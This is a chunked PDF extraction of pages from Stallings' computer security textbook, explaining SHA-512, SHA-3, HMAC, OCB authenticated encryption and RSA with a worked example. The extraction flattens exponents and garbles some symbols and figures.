       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 663, 'page_label': '662'}, page_content='662  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nThe output of the eightieth round is added to the input to the first round \\n(Hi- 1) to produce Hi. The addition is done independently for each of the eight \\nwords in the buffer, with each of the corresponding words in Hi- 1 using  addition \\nmodulo 264.\\n• Step 5: Output. After all N 1024-bit blocks have been processed, the output \\nfrom the Nth stage is the 512-bit message digest.\\nThe SHA-512 algorithm has the property that every bit of the hash code is a \\nfunction of every bit of the input. The complex repetition of the basic function F \\nproduces results that are well mixed; that is, it is unlikely that two messages chosen at \\nrandom, even if they exhibit similar regularities, will have the same hash code. Unless \\nthere is some hidden weakness in SHA-512, which has not so far been published, the \\ndifficulty of coming up with two messages having the same message digest is on the \\norder of 2256 operations, while the difficulty of finding a message with a given digest \\nis on the order of 2512 operations.\\nSHA-3\\nSHA-2, particularly the 512-bit version, would appear to provide unassailable  security. \\nHowever, SHA-2 shares the same structure and mathematical operations as its prede-\\ncessors, and this is a cause for concern. Because it would take years to find a suitable \\nreplacement for SHA-2, should it become vulnerable, NIST announced in 2007 a \\ncompetition to produce the next generation NIST hash function, to be called SHA-3. \\nThe basic requirements that needed to be satisfied by any candidate for SHA-3 are \\nthe following:\\n1. It must be possible to replace SHA-2 with SHA-3 in any application by a simple \\ndrop-in substitution. Therefore, SHA-3 must support hash value lengths of 224, \\n256, 384, and 512 bits.\\n2. SHA-3 must pr eserve the online nature of SHA-2. That is, the algorithm \\nmust process comparatively small blocks (512 or 1024 bits) at a time instead \\nof requiring that the entire message be buffered in memory before process -\\ning it.\\nAfter an extensive consultation and vetting process, NIST selected a winning \\nsubmission and formally published SHA-3 as FIPS 202 ( SHA-3 Standard: Permuta-\\ntion-Based Hash and Extendable-Output Functions, August 2015).\\nThe structure and functions used for SHA-3 are substantially different from \\nthose shared by SHA-2 and SHA-1. Thus, if weaknesses are discovered in either \\nSHA-2 or SHA-3, users have the option to switch to the other standard. SHA-2 \\nhas held up well and NIST considers it secure for general use. So for now, SHA-3 \\nis a complement to SHA-2 rather than a replacement. The relatively compact \\nnature of SHA-3 may make it useful for so-called “embedded” or smart devices \\nthat connect to electronic networks but are not themselves full-fledged computers. \\nExamples include sensors in a building-wide security system and home appliances \\nthat can be controlled remotely. A detailed presentation of SHA-3 is provided in \\nAppendix K.\\nM21_STAL0611_04_GE_C21.indd   662 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 664, 'page_label': '663'}, page_content='21.2 / HMAC  663\\n 21.2 HMAC\\nIn this section, we look at the hash code approach to message authentication. \\n Appendix E looks at message authentication based on block ciphers. In recent years, \\nthere has been increased interest in developing a MAC derived from a cryptographic \\nhash code, such as SHA-1. The motivations for this interest are as follows:\\n• Cryptographic hash functions generally execute faster in software than conven-\\ntional encryption algorithms such as DES.\\n• Library code for cryptographic hash functions is widely available.\\nA hash function such as SHA-1 was not designed for use as a MAC and cannot \\nbe used directly for that purpose because it does not rely on a secret key. There have \\nbeen a number of proposals for the incorporation of a secret key into an existing hash \\nalgorithm. The approach that has received the most support is HMAC [BELL96]. \\nHMAC has been issued as RFC 2104 (HMAC: Keyed-Hashing for Message Authenti-\\ncation, 1997), has been chosen as the mandatory-to- implement MAC for IP Security, \\nand is used in other Internet  protocols, such as Transport Layer Security (TLS, soon to \\nreplace Secure Sockets Layer) and Secure Electronic  Transaction (SET).\\nHMAC Design Objectives\\nRFC 2104 lists the following design objectives for HMAC:\\n• To use, without modifications, available hash functions—in particular, hash \\nfunctions that perform well in software, and for which code is freely and widely \\navailable.\\n• To allow for easy replaceability of the embedded hash function in case faster \\nor more secure hash functions are found or required.\\n• To preserve the original performance of the hash function without incurring a \\nsignificant degradation.\\n• To use and handle keys in a simple way.\\n• To ha ve a well-understood cryptographic analysis of the strength of the \\n authentication mechanism based on reasonable assumptions on the embedded \\nhash function.\\nThe first two objectives are important to the acceptability of HMAC. HMAC treats \\nthe hash function as a “black box.” This has two benefits. First, an existing implementa-\\ntion of a hash function can be used as a module in implementing HMAC. In this way, the \\nbulk of the HMAC code is prepackaged and ready to use without modification. Second, \\nif it is ever desired to replace a given hash function in an HMAC implementation, all that \\nis required is to remove the existing hash function module and drop in the new module. \\nThis could be done if a faster hash function were desired. More important, if the secu-\\nrity of the embedded hash function were compromised, the security of HMAC could \\nbe retained simply by replacing the embedded hash function with a more secure one.\\nThe last design objective in the preceding list is, in fact, the main advantage \\nof HMAC over other proposed hash-based schemes. HMAC can be proven secure \\nM21_STAL0611_04_GE_C21.indd   663 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 665, 'page_label': '664'}, page_content='664  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nprovided that the embedded hash function has some reasonable cryptographic \\nstrengths. We return to this point later in this section, but first we examine the struc-\\nture of HMAC.\\nHMAC Algorithm\\nFigure 21.4 illustrates the overall operation of HMAC. Let us define the following \\nterms:\\n H = embedded hash function (e.g., SHA)\\n M = message input to HMAC (including the padding specified in the \\n embedded hash function)\\n Yi = ith block of M, 0 … i … (L - 1)\\n L = number of blocks in M\\n b = number of bits in a block\\n n = length of hash code produced by embedded hash function\\n K = secret key; if key length is greater than b, the key is input to the hash \\nfunction to produce an n-bit key; recommended length is Ú n\\n K+ = K padded with zeros on the left so that the result is b bits in length\\n ipad  = 00110110 (36 in hexadecimal) repeated b/8 times\\n opad = 01011100 (5C in hexadecimal) repeated b/8 times\\nFigure 21.4 HMAC Structure\\nK +\\nSi\\nSo\\nY0 Y1 YL-1\\nb bits\\nb bits\\nb bits b bits\\nipad\\nK + opad\\nHashIV\\nn bits\\nn bits\\nPad to b bits\\nHashIV\\nn bits\\nn bits\\nHMAC( K, M )\\nH(Si || M )\\nM21_STAL0611_04_GE_C21.indd   664 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 666, 'page_label': '665'}, page_content='21.2 / HMAC  665\\nThen HMAC can be expressed as follows:\\nHMAC(K, M) = H[(K+ /uni2295.altopad) }H[K+ /uni2295.altipad] }M]]\\nIn words,\\n1. Append zeros to the left end of K to create a b-bit string K+ (e.g., if K is of \\nlength 160 bits and b = 512, then K will be appended with 44 zero bytes 0x00).\\n2. XOR (bitwise exclusive-OR) K+ with ipad to produce the b-bit block Si.\\n3. Append M to Si.\\n4. Apply H to the stream generated in step 3.\\n5. XOR K+ with opad to produce the b-bit block So.\\n6. Append the hash result from step 4 to So.\\n7. Apply H to the stream generated in step 6 and output the result.\\nNote the XOR with ipad results in flipping one-half of the bits of K.  Similarly, \\nthe XOR with opad results in flipping one-half of the bits of K, but a different set of \\nbits. In effect, by passing Si and So through the hash algorithm, we have pseudoran-\\ndomly generated two keys from K.\\nHMAC should execute in approximately the same time as the embedded hash \\nfunction for long messages. HMAC adds three executions of the basic hash function \\n(for Si, So, and the block produced from the inner hash).\\nSecurity of HMAC\\nThe security of any MAC function based on an embedded hash function depends in \\nsome way on the cryptographic strength of the underlying hash function. The appeal \\nof HMAC is that its designers have been able to prove an exact relationship between \\nthe strength of the embedded hash function and the strength of HMAC.\\nThe security of a MAC function is generally expressed in terms of the proba-\\nbility of successful forgery with a given amount of time spent by the forger and a \\ngiven number of message-MAC pairs created with the same key. In essence, it is \\nproved in [BELL96] that for a given level of effort (time, message-MAC pairs) on \\nmessages generated by a legitimate user and seen by the attacker, the probability \\nof successful attack on HMAC is equivalent to one of the following attacks on the \\nembedded hash function:\\n1. The attacker is able to compute an output of the compression function even \\nwith an IV that is random, secret, and unknown to the attacker.\\n2. The attacker finds collisions in the hash function even when the IV is random \\nand secret.\\nIn the first attack, we can view the compression function as equivalent to the \\nhash function applied to a message consisting of a single b-bit block. For this attack, \\nthe IV of the hash function is replaced by a secret, random value of n bits. An attack \\non this hash function requires either a brute-force attack on the key, which is a level \\nof effort on the order of 2n, or a birthday attack, which is a special case of the second \\nattack, discussed next.\\nIn the second attack, the attacker is looking for two messages M and M= that pro-\\nduce the same hash: H(M) = H(M=). This is the birthday attack mentioned  previously. \\nM21_STAL0611_04_GE_C21.indd   665 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 667, 'page_label': '666'}, page_content='666  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nWe have stated that this requires a level of effort of 2n/2 for a hash length of n. On this \\nbasis, the security of the earlier MD5 hash function was called into  question, because \\na level of effort of 264 looks feasible with today’s technology. Does this mean that a  \\n128-bit hash function such as MD5 is unsuitable for HMAC? The answer is no, because \\nof the following argument. To attack MD5, the attacker can choose any set of messages \\nand work on these offline on a dedicated computing facility to find a collision. Because \\nthe attacker knows the hash algorithm and the default IV , the attacker can generate \\nthe hash code for each of the messages that the attacker generates. However, when \\nattacking HMAC, the attacker cannot generate message/code pairs offline because \\nthe attacker does not know K. Therefore, the attacker must observe a sequence of \\nmessages generated by HMAC under the same key and perform the attack on these \\nknown messages. For a hash code length of 128 bits, this requires 264 observed blocks \\n(272 bits) generated using the same key. On a 1 -Gbps link, one would need to observe a \\ncontinuous stream of messages with no change in key for about 150,000 years in order \\nto succeed. Thus, if speed is a concern, it is acceptable to use MD5 rather than SHA \\nas the embedded hash function for HMAC, although use of MD5 is now uncommon.\\n 21.3 AUTHENTICATED ENCRYPTION\\nAuthenticated encryption (AE) is a term used to describe encryption systems that \\nsimultaneously protect confidentiality and authenticity (integrity) of communica -\\ntions; that is, AE provides both message encryption and message authentication. \\nMany applications and protocols require both forms of security, but until recently \\nthe two services have been designed separately. AE is implemented using a block \\ncipher mode structure. One example that is used in a number of applications is \\nCCM, described in Appendix E. In this section, we examine Offset Codebook (OCB) \\n[ROGA03]. OCB is an NIST proposed block cipher mode of operation [ROGA01], \\nand is a proposed Internet Standard defined in RFC 7253 (The OCB Authenticated-\\nEncryption  Algorithm, 2014). OCB is also approved as an authenticated encryp -\\ntion technique in the IEEE 802.11 wireless LAN standard. And, as mentioned in \\n Chapter\\xa013, OCB is included in MiniSec, the open-source IoT security module.\\nA key objective for OCB is efficiency. This is achieved by minimizing the num-\\nber of encryptions required per message and by allowing for parallel operation on \\nthe blocks of a message.\\nFigure 21.5 shows the overall structure for OCB encryption and authentication. \\nTypically, AES is used as the encryption algorithm. The message M to be encrypted \\nand authenticated is divided into n-bit blocks, with the exception of the last block, \\nwhich may be less than n bits. Typically, n = 128. Only a single pass through the mes-\\nsage is required to generate both the ciphertext and the authentication code. The total \\nnumber of blocks is m = <len(M)/n=.\\nNote the encryption structure for OCB is similar to that of electronic codebook \\n(ECB) mode. Each block is encrypted independently of the other blocks, so that it is \\npossible to perform all m encryptions simultaneously. As was mentioned in  Chapter\\xa020, \\nwith ECB, if the same b-bit block of plaintext appears more than once in the message, \\nit always produces the same ciphertext. Because of this, for lengthy messages, the ECB \\nmode may not be secure. OCB eliminates this property by using an offset Z[i] for each \\nM21_STAL0611_04_GE_C21.indd   666 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 668, 'page_label': '667'}, page_content='21.3 / AUTHENTICATEd ENCRyPTION  667\\nblock M[i], such that each Z[i] is unique; the offset is XORed with the plaintext and \\nXORed again with the encrypted output. Thus, with encryption key K we have\\nC[i] = EK(M[i] /uni2295.altZ[i]) /uni2295.altZ[i]\\nwhere EK(X) is the encryption of plaintext X using key K, and /uni2295.alt is the exclusive-\\nOR operation. Because of the use of the offset, two blocks in the same message that \\nare identical will produce two different ciphertexts.\\nThe upper part of Figure 21.5 indicates how the Z[i]s are generated. An  arbitrary \\nn-bit value N called the nonce is chosen; the only requirement is that if multiple mes-\\nsages are encrypted with the same key, a different nonce must be used each time such \\nFigure 21.5 OCB Encryption and Authentication\\ntrunc\\npad\\nﬁrst\\nt bits t\\nn = block length in bits\\nN = nonce\\nlen(M[ m]) = length of M[ m] represented as an n-bit integer\\ntrunc(Y[ m]) = deletes least signiﬁcant bits so that result is same\\n                         length as M[ m]\\npad = pad with least signiﬁcant 0 bits to length n\\nt = length of authentication tag\\nM[1]\\nC[1]\\nZ[1]\\nL\\nE K\\nZ[1]\\nN\\n0 n L\\nL and R used\\nto form\\nZ[1], Z[2], ...\\nE K\\nE K\\nM[2]\\nC[2]\\nZ[2]\\nE K\\nZ[2]\\nM[ m – 1]\\nC[ m – 1]\\nZ[ m – 1]\\nE K\\nZ[ m – 1]\\ntag\\nchecksum\\nZ[ m]\\nE K\\nM[ m]\\nC[ m]\\nZ[ m]\\nY[ m]\\nX[ m]\\nE K\\nL(–1)\\nlen\\nR\\nM21_STAL0611_04_GE_C21.indd   667 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 669, 'page_label': '668'}, page_content='668  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nthat each nonce is only used once. Each different value of N will produce a different \\nset of Z[i]. Thus, if two different messages have identical blocks in the same position in \\nthe message, they will produce different ciphertexts because the Z[i] will be different.\\nThe calculation of the Z[ i] is somewhat complex and is summarized in the \\n following equations:\\nL(0) = L = EK(0n) where 0n consists of n zero bits.\\nR = EK(N /uni2295.altL)\\nL(i) = 2 # L(i - 1) 1 … i … m\\nZ[1] = L /uni2295.altR\\nZ[i] = Z(i - 1) /uni2295.altL(ntz(i)) 1 … i … m\\nThe operator #  refers to multiplication over the finite field GF(2n); a discussion \\nof finite fields is beyond our scope and is covered in [STAL17]. The operator ntz(i) \\ndenotes the number of trailing (least significant) zeros in i. The resulting Z[i] values \\nare a maximal Hamming distance apart [WALK05].\\nThus, the values Z[i] are a function of both the nonce and the encryption key. \\nThe nonce does not need to be kept secret and is communicated to the recipient in a \\nmanner outside the scope of the specification.\\nBecause the length of M may not be an integer multiple of n, the final block \\nis treated differently, as shown in Figure 21.5. The length of M[ m], represented as \\nan n-bit integer, is used to calculate X[m] = len(M[m]) /uni2295.altL(-1) /uni2295.altZ[m]. L(-1) is \\ndefined as L/2 over the finite field or, equivalently, L # 2-1. Next, Y[m] = EK(X[m]). \\nThen, Y[m] is truncated to len(M[m]) bits (by deleting the necessary number of least \\nsignificant bits) and XORed with M[m]. Thus, the final ciphertext C is the same length \\nas the original plaintext M.\\nA checksum is produced from the message M as follows:\\nchecksum = M[1] /uni2295.altM[2] /uni2295.altc/uni2295.altY[m] /uni2295.altC[m]0*\\nWhere C[m]0* consists of C[m] padded with least significant bits to the length \\nn. Finally, an authentication tag of length t is generated, using the same key as is used \\nfor encryption:\\ntag = first t bits of EK(checksum /uni2295.altZ[m])\\nThe bit length t of the tag varies according to the application. The size of the tag \\ncontrols the level of authentication. To verify the authentication tag, the decryptor can \\nrecompute the checksum, then recompute the tag, and finally check that is equal to the one \\nthat was sent. If the ciphertext passes the test, then OCB produces the plaintext normally.\\nFigure 21.6 summarizes the OCB algorithms for encryption and decryption. It \\nis easy to see that decryption is the inverse of encryption. We have\\n EK(M[i] /uni2295.altZ[i]) /uni2295.altZ[i] = C[i]\\n EK(M[i] /uni2295.altZ[i]) = C[i] /uni2295.altZ[i]\\n DK(EK(M[i] /uni2295.altZ[i])) = DK(C[i] /uni2295.altZ[i])\\n M[i] /uni2295.altZ[i] = DK(C[i] /uni2295.altZ[i])\\n M[i] = DK(C[i] /uni2295.altZ[i]) /uni2295.altZ[i]\\nM21_STAL0611_04_GE_C21.indd   668 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 670, 'page_label': '669'}, page_content='21.4 / THE RSA PUblIC-KEy ENCRyPTION AlgORITHM  669\\nalgorithm OCB@EncryptK(N, M)\\nPartition M into M[1]\\xa0.\\xa0.\\xa0.\\xa0M[m]\\nL d L(0) d EK(0n)\\nR d EK(N /uni2295.altL)\\nfor i d 1 to m do L(i) d 2 # L(i - 1)\\nL(-1) = L # 2-1\\nZ[1] d L /uni2295.altR\\nfor i d 2 to m do Z[i] d Z[i - 1] /uni2295.altL(ntz(i))\\nfor i d 1 to m - 1 do\\n C[i] d EK(M[i] /uni2295.altZ[i]) /uni2295.altZ[i]\\nX[m] d len(M[m]) /uni2295.altL(-1) /uni2295.altZ[m]\\nY[m] d EK(X[m])\\nC[m] d M[m] /uni2295.alt(first len(M[m]) bits of Y[m])\\nChecksum d\\n M[1] /uni2295.altc/uni2295.altM[m - 1] /uni2295.altC[m]0*/uni2295.altY[m]\\nTag d EK(Checksum /uni2295.altZ[m]) [first t bits]\\nalgorithm OCB@DecryptK(N, M)\\nPartition M into M[1]\\xa0.\\xa0.\\xa0.\\xa0M[m]\\nL d L(0) d EK(0n)\\nR d EK(N /uni2295.altL)\\nfor i d 1 to m do L(i) d 2 # L(i - 1)\\nL(-1) = L # 2-1\\nZ[1] d L /uni2295.altR\\nfor i d 2 to m do Z[i] d Z[i - 1] /uni2295.altL(ntz(i))\\nfor i d 1 to m - 1 do\\n M[i] d DK(C[i] /uni2295.altZ[i]) /uni2295.altZ[i]\\nX[m] d len(M[m]) /uni2295.altL(-1) /uni2295.altZ[m]\\nY[m] d EK(X[m])\\nM[m] d (first len(C[m]) bits of Y[m]) /uni2295.altC[m]\\nChecksum d\\n M[1] /uni2295.altc/uni2295.altM[m - 1] /uni2295.altC[m]0*/uni2295.altY[m]\\nTag/uni2032d EK(Checksum /uni2295.altZ[m]) [first t bits]\\nFigure 21.6 OCB Algorithms\\n 21.4 THE RSA PUBLIC-KEY ENCRYPTION ALGORITHM\\nPerhaps the most widely used public-key algorithms are RSA and Diffie-Hellman. \\nWe examine RSA plus some security considerations in this section.1 Diffie-Hellman \\nis covered in Section 21.5.\\nDescription of the Algorithm\\nOne of the first public-key schemes was developed in 1977 by Ron Rivest, Adi Shamir, \\nand Len Adleman at MIT and first published in 1978 [RIVE78]. The RSA scheme \\nhas since that time reigned supreme as the most widely accepted and implemented \\napproach to public-key encryption. RSA is a block cipher in which the plaintext and \\nciphertext are integers between 0 and n - 1 for some n.\\nEncryption and decryption are of the following form, for some plaintext block \\nM and ciphertext block C:\\n C = Me mod n\\n M = Cd mod n = (Me)d mod n = Med mod n\\nBoth sender and receiver must know the values of n and e, and only the receiver \\nknows the value of d. This is a public-key encryption algorithm with a public key of \\nPU = 5e, n6 and a private key of PR = 5d, n6. For this algorithm to be satisfactory \\nfor public-key encryption, the following requirements must be met:\\n1. It is possible to find values of e, d, n such that Med mod n = M for all M 6 n.\\n1This section uses some elementary concepts from number theory. For a review, see Appendix B.\\nM21_STAL0611_04_GE_C21.indd   669 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 671, 'page_label': '670'}, page_content='670  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\n2. It is relatively easy to calculate Me and Cd for all values of M 6 n.\\n3. It is infeasible to determine d given e and n.\\nThe first two requirements are easily met. The third requirement can be met \\nfor large values of e and n.\\nMore should be said about the first requirement. We need to find a relationship \\nof the form\\nMed mod n = M\\nThe preceding relationship holds if e and d are multiplicative inverses modulo \\nf(n), where f(n) is the Euler totient function. It is shown in Appendix B that for p, q \\nprime, f(pq) = (p - 1)(q - 1). f(n), referred to as the Euler totient of n, is the \\nnumber of positive integers less than n and relatively prime to n. The relationship \\nbetween e and d can be expressed as\\ned mod f(n) = 1\\nThis is equivalent to saying\\n ed mod f(n) = 1\\n d mod f(n) = e-1\\nThat is, e and d are multiplicative inverses mod f(n). According to the rules of modu-\\nlar arithmetic, this is true only if d (and therefore e) is relatively prime to f(n). \\nEquivalently, gcd(f(n),d) = 1; that is, the greatest common divisor of f(n) and d is 1.\\nFigure 21.7 summarizes the RSA algorithm. Begin by selecting two prime num-\\nbers, p and q, and calculating their product n, which is the modulus for encryption and \\nFigure 21.7 The RSA Algorithm\\nKey Generation\\nSelect p, qp and q both prime,\\nCalculate n = p * q\\nCalculate h( n) = ( p - 1)( q - 1)\\nSelect integer e gcd( h( n), e) = 1; 1 6 e6 h( n)\\nCalculate d de mod h( n) = 1 \\nPublic key KU = { e,n}\\nPrivate key KR = { d, n}\\npqZ\\nEncryption\\nPlaintext: M 6 n\\nCiphertext: C = M ee (mod n)\\nDecryption\\nCiphertext: C\\nPlaintext: M = C d (mod n)\\nM21_STAL0611_04_GE_C21.indd   670 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 672, 'page_label': '671'}, page_content='21.4 / THE RSA PUblIC-KEy ENCRyPTION AlgORITHM  671\\ndecryption. Next, we need the quantity f(n). Then select an integer e that is relatively \\nprime to f(n) [i.e., the greatest common divisor of e and f(n) is 1]. Finally, calculate \\nd as the multiplicative inverse of e, modulo f(n). It can be shown that d and e have \\nthe desired properties.\\nSuppose user A has published its public key and user B wishes to send the mes-\\nsage M to A. Then B calculates C = Me (mod n) and transmits C. On receipt of this \\nciphertext, user A decrypts by calculating M = Cd (mod n).\\nAn example, from [SING99], is shown in Figure 21.8. For this example, the keys \\nwere generated as follows:\\n1. Select two prime numbers, p = 17 and q = 11.\\n2. Calculate n = pq = 17 * 11 = 187.\\n3. Calculate f(n) = (p - 1)(q - 1) = 16 * 10 = 160.\\n4. Select e such that e is relatively prime to f(n) = 160 and less than f(n); we choose \\ne = 7.\\n5. Determine d such that de mod 160 = 1 and d 6 160. The correct value is \\nd = 23, because 23 * 7 = 161 = (1 * 160) + 1.\\nThe resulting keys are public key PU = 57, 1876 and private key PR =\\n523, 1876. The example shows the use of these keys for a plaintext input of M = 88. \\nFor encryption, we need to calculate C = 887 mod 187 . Exploiting the properties of \\nmodular arithmetic, we can do this as follows:\\n 887 mod 187 = [(884 mod 187) * (882 mod 187) * (881 mod 187)] mod 187\\n 881 mod 187 = 88\\n 882 mod 187 = 7744 mod 187 = 77\\n 884 mod 187 = 59,969,536 mod 187 = 132\\n 887 mod 187 = (88 * 77 * 132) mod 187 = 894,432 mod 187 = 11\\nFor decryption, we calculate M = 1123 mod 187:\\n 1123 mod 187 = [(111 mod 187) * (112 mod 187) * (114 mod 187) *\\n (118 mod 187) * (118 mod 187)] mod 187\\n 111 mod 187 = 11\\n 112 mod 187 = 121\\n 114 mod 187 = 14,641 mod 187 = 55\\nFigure 21.8 Example of RSA Algorithm\\nEncryption\\nPlaintext\\n88\\nPlaintext\\n88\\nCiphertext\\n1188  mod 187 = 11\\nPU = 7, 187\\nDecryption\\n7\\n11    mod 187 = 88\\nPR = 23, 187\\n23\\nM21_STAL0611_04_GE_C21.indd   671 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 673, 'page_label': '672'}, page_content='672  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\n 118 mod 187 = 214,358,881 mod 187 = 33\\n 1123 mod 187 = (11 * 121 * 55 * 33 * 33) mod 187 = 79, 720, 245\\n mod 187 = 88\\nThe Security of RSA\\nFour possible approaches to attacking the RSA algorithm are as follows:\\n• Brute force: This involves trying all possible private keys.\\n• Mathematical attacks: There are several approaches, all equivalent in effort to \\nfactoring the product of two primes.\\n• Timing attacks: These depend on the running time of the decryption algorithm.\\n• Chosen ciphertext attacks: This type of attack exploits properties of the RSA \\nalgorithm. A discussion of this attack is beyond the scope of this book.\\nThe defense against the brute force approach is the same for RSA as for other \\ncryptosystems; namely, use a large key space. Thus, the larger the number of bits in d, \\nthe better. However, because the calculations involved, both in key generation and \\nin encryption/decryption, are complex, the larger the size of the key, the slower the \\nsystem will run.\\nIn this subsection, we provide an overview of mathematical and timing attacks.\\nThe FacToring Problem We can identify three approaches to attacking RSA \\nmathematically:\\n• Factor n into its two prime factors. This enables calculation of f(n) = (p - 1) \\n* (q - 1), which, in turn, enables determination of d K e-1(mod f(n)).\\n• Determine f(n) directly, without first determining p and q. Again, this enables \\ndetermination of d K e-1(mod f(n)).\\n• Determine d directly, without first determining f(n).\\nMost discussions of the cryptanalysis of RSA have focused on the task of factor-\\ning n into its two prime factors. Determining f(n) given n is equivalent to factoring n \\n[RIBE96]. With presently known algorithms, determining d given e and n appears to \\nbe at least as time consuming as the factoring problem. Hence, we can use factoring \\nperformance as a benchmark against which to evaluate the security of RSA.\\nFor a large n with large prime factors, factoring is a hard problem, but not as \\nhard as it used to be. Just as it had done for DES, RSA Laboratories issued challenges \\nfor the RSA cipher with key sizes of 100, 110, 120, and so on, digits. The latest chal-\\nlenge to be met is the RSA-768 challenge with a key length of 232 decimal digits, or \\n768 bits. Table 21.2 shows the results to date.\\nA striking fact about Table 21.2 concerns the method used. Until the mid-\\n1990s, factoring attacks were made using an approach known as the quadratic sieve. \\nThe attack on RSA-130 used a newer algorithm, the generalized number field sieve \\n(GNFS), and was able to factor a larger number than RSA-129 at only 20% of the \\ncomputing effort.\\nThe threat to larger key sizes is twofold: the continuing increase in computing \\npower, and the continuing refinement of factoring algorithms. We have seen that \\nthe move to a different algorithm resulted in a tremendous speedup. We can expect \\nM21_STAL0611_04_GE_C21.indd   672 10/11/17   3:19 PM'),\n",
